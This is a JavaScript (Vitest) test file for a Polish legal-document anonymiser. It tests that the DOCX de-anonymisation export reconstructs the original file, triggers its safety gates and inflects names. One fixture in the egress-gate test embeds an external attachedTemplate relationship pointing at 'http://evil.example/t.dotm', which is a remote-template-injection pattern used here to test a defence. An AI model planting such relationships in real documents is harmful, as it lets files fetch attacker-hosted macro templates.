// @vitest-environment jsdom
//
// DOCX-REBUILD §3.4/§9.3 regression: exportDeanonDocuments (src/main.js) is
// the only place that turns the live `outcomes` state into the projection
// handed to exportDeanonOutcomes (src/export/deanon.js). If that projection
// drops the outcome's `docx` field, a DOCX "pismo od AI" outcome silently
// falls back to the flat generator (brand-new document from the text
// preview, K-Law letterhead lost) instead of the surgical reconstruction —
// AND skips the export-time egress (§9.3) and zero-replacement (P-4) gates,
// which only run inside the reconstruction branch. No error is shown; the
// radca just gets the wrong file believing formatting was preserved.
//
// This boots the real app (harness mirrors src/main.stale-classify.test.js
// per repo convention) and drives the actual DOM end to end: paste+anonymize
// a source (populates the legend for real), import a real DOCX outcome,
// click "Eksportuj DOCX", and read the user-facing result. The reconstruction
// branch is the ONLY one that ever produces a report, and the workspace UI
// appends the report's token-replacement count to the success message
// (see reportSummary in ui/deanon-workspace/index.js) — so that message is
// the observable, user-facing signature of "did reconstruction actually run".
import { beforeEach, describe, expect, it, vi } from 'vitest';
import { buildZip } from './docx-rebuild/test-helpers/zip-fixture.js';
import { openZip } from './docx-rebuild/zip-reader.js';

const TOKEN = '[PERSON_NAME_1]';
const DOCX_BODY_TEXT = `Pozwany ${TOKEN} wnosi o oddalenie powództwa.`;

// Mammoth's real parsing fidelity is irrelevant to this defect — stub the
// extraction so the test doesn't depend on a heavyweight npm parser
// understanding a synthetic fixture. The RAW BYTES (what actually matters
// here) stay real, built by the same fixture helper the deanon.js docx
// export tests already rely on (src/export/deanon-docx.test.js).
vi.mock('./file-import/docx.js', () => ({
  extractDocx: async (file) => ({
    text: DOCX_BODY_TEXT,
    meta: { filename: file.name, mimeType: file.type, sizeBytes: file.size },
  }),
}));

// exportDeanonOutcomes/rebuildDocx stay 100% real (that IS the subject under
// test). Only downloadBlob is stubbed: jsdom has no object-URL download path
// and that side effect is irrelevant to this defect.
vi.mock('./export/deanon.js', async (importOriginal) => {
  const actual = await importOriginal();
  return { ...actual, downloadBlob: vi.fn() };
});

const XML_DECL = '<?xml version="1.0" encoding="UTF-8" standalone="yes"?>';
const W = 'http://schemas.openxmlformats.org/wordprocessingml/2006/main';

function docxParts(docBody, extraParts = {}) {
  return {
    '[Content_Types].xml': `${XML_DECL}<Types xmlns="http://schemas.openxmlformats.org/package/2006/content-types">`
      + '<Default Extension="rels" ContentType="application/vnd.openxmlformats-package.relationships+xml"/>'
      + '<Default Extension="xml" ContentType="application/xml"/>'
      + '<Override PartName="/word/document.xml" ContentType="application/vnd.openxmlformats-officedocument.wordprocessingml.document.main+xml"/>'
      + '</Types>',
    '_rels/.rels': `${XML_DECL}<Relationships xmlns="http://schemas.openxmlformats.org/package/2006/relationships">`
      + '<Relationship Id="rId1" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/officeDocument" Target="word/document.xml"/>'
      + '</Relationships>',
    'word/document.xml': `${XML_DECL}<w:document xmlns:w="${W}"><w:body>${docBody}</w:body></w:document>`,
    ...extraParts,
  };
}

async function docxBytes(docBody, extraParts = {}) {
  return buildZip(Object.entries(docxParts(docBody, extraParts)).map(([name, data]) => ({ name, data, method: 0 })));
}

class FakeWorker {
  static instances = [];

  constructor(url, options) {
    this.url = url;
    this.options = options;
    this.messages = [];
    this.onmessage = null;
    FakeWorker.instances.push(this);
  }

  postMessage(message) {
    this.messages.push(message);
  }

  emit(message) {
    this.onmessage?.({ data: message });
  }
}

function installToolDom() {
  document.body.innerHTML = `
    <div id="webnn-hint" hidden>
      <button id="webnn-hint-trigger" type="button" aria-expanded="false"></button>
      <div id="webnn-hint-panel" hidden>
        <button id="webnn-hint-close" type="button"></button>
      </div>
    </div>
    <div class="tool">
      <p data-status="model"></p>
      <div data-mode-panel="anonymize">
        <div id="doc-list-root"></div>
        <div id="entity-selector-root"></div>
        <input id="allow-gpu-checkbox" type="checkbox">
        <input id="preload-ocr-checkbox" type="checkbox">
        <input id="preload-ner-checkbox" type="checkbox">
        <div id="workspace-tabs-root"></div>
        <div class="editor-pane">
          <div id="editor-toolbar-root"></div>
          <div id="sources-list-root"></div>
          <section id="debug-section" hidden><div id="debug-panel"></div></section>
        </div>
        <b data-testid="run-bar-docs">0</b>
        <b data-testid="run-bar-tokens">0</b>
        <div data-testid="run-bar-meter" hidden><div data-testid="run-bar-meter-fill"></div></div>
        <p data-testid="run-bar-status" hidden></p>
        <div id="webmcp-control-root"></div>
        <button data-action="copy-all" data-testid="copy-all" type="button" disabled>Kopiuj wszystkie</button>
        <button data-action="anonymize" type="button" disabled>Anonimizuj</button>
      </div>
      <div data-mode-panel="deanonymize" hidden>
        <div id="deanon-workspace-root"></div>
      </div>
    </div>
  `;
}

function installWebMcpFake() {
  globalThis.WebMCP = class FakeWebMCP {
    constructor() {
      this.isConnected = false;
    }

    registerTool() {}
  };
}

async function bootApp() {
  vi.resetModules();
  FakeWorker.instances = [];
  installToolDom();
  installWebMcpFake();
  globalThis.Worker = FakeWorker;
  let nextUuid = 2;
  vi.spyOn(globalThis.crypto, 'randomUUID').mockImplementation(() => `s${nextUuid++}`);
  await import('./main.js');
  const worker = FakeWorker.instances[0];
  worker.emit({ type: 'configured' });
  return worker;
}

function addPasteSourceWithText(text) {
  let pasteButton = document.querySelector('[data-testid="sources-add-paste"]');
  if (!pasteButton) {
    document.querySelector('[data-testid="ws-tab-add"]')?.click();
    pasteButton = document.querySelector('[data-testid="sources-add-paste"]');
  }
  expect(pasteButton).not.toBeNull();
  pasteButton.click();
  const activeCard = document.querySelector('[data-testid^="source-card-"][data-active="true"]');
  const textarea = activeCard?.querySelector('.ann-editor-textarea')
    ?? document.querySelector('.ann-editor-textarea');
  expect(textarea).not.toBeNull();
  textarea.value = text;
  textarea.dispatchEvent(new Event('input', { bubbles: true }));
}

function clickAnonymize() {
  document.querySelector('[data-action="anonymize"]').click();
}

async function waitFor(predicate, { timeout = 4000, interval = 10 } = {}) {
  const start = Date.now();
  while (!predicate()) {
    if (Date.now() - start > timeout) throw new Error('waitFor: timed out waiting for condition');
    await new Promise((resolve) => setTimeout(resolve, interval));
  }
}

// Populates a real legend (anonymize a source, exactly like a user), imports
// a DOCX "pismo od AI" carrying the given raw bytes, clicks "Eksportuj
// DOCX", and returns the final run-bar-stats message text.
async function importDocxAndExport(worker, bytes) {
  addPasteSourceWithText('Jan Kowalski podpisał umowę.');
  clickAnonymize();
  worker.emit({
    type: 'result',
    id: 's2',
    data: [{ entity_group: 'PERSON_NAME', start: 0, end: 'Jan Kowalski'.length, score: 0.99, source: 'ner' }],
  });

  const file = new File([bytes], 'pismo-od-AI.docx', {
    type: 'application/vnd.openxmlformats-officedocument.wordprocessingml.document',
  });
  const input = document.querySelector('[data-testid="deanon-import-docx-input"]');
  expect(input).not.toBeNull();
  Object.defineProperty(input, 'files', { value: [file] });
  input.dispatchEvent(new Event('change'));
  await waitFor(() => document.querySelector('[data-testid="deanon-docx-badge"]') !== null);

  const exportButton = document.querySelector('[data-testid="deanon-export-docx"]');
  expect(exportButton).not.toBeNull();
  expect(exportButton.disabled).toBe(false);
  exportButton.click();

  await waitFor(() => {
    const stats = document.querySelector('[data-testid="deanon-run-bar-stats"]')?.textContent ?? '';
    return stats !== '' && stats !== 'Generuję plik DOCX…';
  });
  return document.querySelector('[data-testid="deanon-run-bar-stats"]').textContent;
}

describe('exportDeanonDocuments — DOCX outcome projection (main.js:553)', () => {
  beforeEach(() => {
    vi.restoreAllMocks();
    delete globalThis.Worker;
    delete globalThis.WebMCP;
  });

  it('exports a DOCX outcome via reconstruction, not the flat fallback (report reaches the UI)', async () => {
    const worker = await bootApp();
    const bytes = await docxBytes(`<w:p><w:r><w:t xml:space="preserve">${DOCX_BODY_TEXT}</w:t></w:r></w:p>`);

    const stats = await importDocxAndExport(worker, bytes);

    // THE bug, observed exactly as the user would see it: before the fix,
    // main.js's outcomes.map(...) projection at line 553 dropped `docx`, so
    // outcome?.docx?.bytes was falsy in exportDeanonOutcomes, the flat
    // generateDocxBlob fallback ran instead of rebuildDocx, and `reports`
    // stayed empty — the success message was bare, with no reconstruction
    // summary appended (reportSummary returns '' for an empty/missing array).
    expect(stats).toBe('Pobrano plik DOCX · rekonstrukcja DOCX: 1 tokenów podmienionych');
  });

  // §9.3/P-4: these export-time gates live INSIDE rebuildDocxBlob, so before
  // the fix they were silently skipped (the flat fallback never sees them) —
  // exactly like the reconstruction itself. Proven here through the same
  // real main.js path, not just the lower-level exportDeanonOutcomes tests.
  it('surfaces the zero-replacement gate (P-4) through the real export flow', async () => {
    const worker = await bootApp();
    const bytes = await docxBytes('<w:p><w:r><w:t>Zero tokenów tutaj.</w:t></w:r></w:p>');

    const stats = await importDocxAndExport(worker, bytes);

    expect(stats).toContain('nie znaleziono żadnego tokenu');
  });

  it('surfaces the egress gate (§9.3) through the real export flow', async () => {
    const worker = await bootApp();
    const bytes = await docxBytes(
      `<w:p><w:r><w:t xml:space="preserve">${DOCX_BODY_TEXT}</w:t></w:r></w:p>`,
      {
        'word/_rels/settings.xml.rels': `${XML_DECL}<Relationships xmlns="http://schemas.openxmlformats.org/package/2006/relationships">`
          + '<Relationship Id="rId1" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/attachedTemplate" Target="http://evil.example/t.dotm" TargetMode="External"/>'
          + '</Relationships>',
      },
    );

    const stats = await importDocxAndExport(worker, bytes);

    expect(stats).toContain('odwołania zewnętrzne');
  });
});

// DOCX-IMPL-PLAN.md FD-3: THE end-to-end proof — through the REAL main.js
// wiring (createFlexionResolver({ morph: null, seen, minConfidence: 'wysoka' }),
// exactly as production builds it), an unannotated token in an unambiguous
// preposition context ("od" -> dopełniacz) gets INFLECTED in the exported
// .docx bytes, using an attested surface form from `seen` — no morphology
// artifact needed (§4.4: attested forms work end to end without one).
describe('exportDeanonDocuments — flexion seam wired end to end (FD-3)', () => {
  beforeEach(() => {
    vi.restoreAllMocks();
    delete globalThis.Worker;
    delete globalThis.WebMCP;
  });

  it('an unannotated token after an unambiguous preposition is inflected using an attested form from `seen`', async () => {
    const worker = await bootApp();

    // Two real mentions of the SAME person in one source, in DIFFERENT
    // grammatical cases — exactly the FLEKSJA-IMPL-PLAN.md G12 recipe
    // (deriveAttested(seen) attributes each surface form to the case it
    // already agrees with, via rule-based surname-form inversion; needs no
    // dictionary for "Jan" at all). Nominative listed first so it becomes
    // the legend's base value (first-seen wins, unchanged anonymizer rule).
    const sourceText = 'Jan Kowalski zawarł umowę. Wcześniej informowano Jana Kowalskiego o warunkach.';
    addPasteSourceWithText(sourceText);
    clickAnonymize();
    const nomStart = sourceText.indexOf('Jan Kowalski');
    const genStart = sourceText.indexOf('Jana Kowalskiego');
    worker.emit({
      type: 'result',
      id: 's2',
      data: [
        { entity_group: 'PERSON_NAME', start: nomStart, end: nomStart + 'Jan Kowalski'.length, score: 0.99, source: 'ner' },
        { entity_group: 'PERSON_NAME', start: genStart, end: genStart + 'Jana Kowalskiego'.length, score: 0.99, source: 'ner' },
      ],
    });

    // No case annotation on the token at all — S-P ("od" -> {D}, a
    // single-case table entry) reaches 'wysoka' confidence on its own
    // (DOCX-IMPL-PLAN.md §4.3, third worked example).
    const bytes = await docxBytes('<w:p><w:r><w:t xml:space="preserve">Zasądza się od [PERSON_NAME_1] kwotę zadośćuczynienia.</w:t></w:r></w:p>');
    const file = new File([bytes], 'pismo-od-AI.docx', {
      type: 'application/vnd.openxmlformats-officedocument.wordprocessingml.document',
    });
    const input = document.querySelector('[data-testid="deanon-import-docx-input"]');
    Object.defineProperty(input, 'files', { value: [file] });
    input.dispatchEvent(new Event('change'));
    await waitFor(() => document.querySelector('[data-testid="deanon-docx-badge"]') !== null);

    document.querySelector('[data-testid="deanon-export-docx"]').click();
    await waitFor(() => {
      const stats = document.querySelector('[data-testid="deanon-run-bar-stats"]')?.textContent ?? '';
      return stats !== '' && stats !== 'Generuję plik DOCX…';
    });
    const stats = document.querySelector('[data-testid="deanon-run-bar-stats"]').textContent;

    // The user-visible signal (FD-5): a report line, not a silent rewrite.
    expect(stats).toContain('1 tokenów podmienionych');
    expect(stats).toContain('odmieniono 1 formę');

    // The actual file bytes carry the inflected form — the real proof.
    const { downloadBlob } = await import('./export/deanon.js');
    const [blob] = downloadBlob.mock.calls.at(-1);
    const rebuilt = openZip(new Uint8Array(await blob.arrayBuffer()));
    const doc = new TextDecoder().decode(await rebuilt.extract('word/document.xml'));
    expect(doc).toContain('Zasądza się od Jana Kowalskiego kwotę zadośćuczynienia.');
    expect(doc).not.toContain('od Jan Kowalski kwotę'); // not the untouched nominative legend value
  });
});
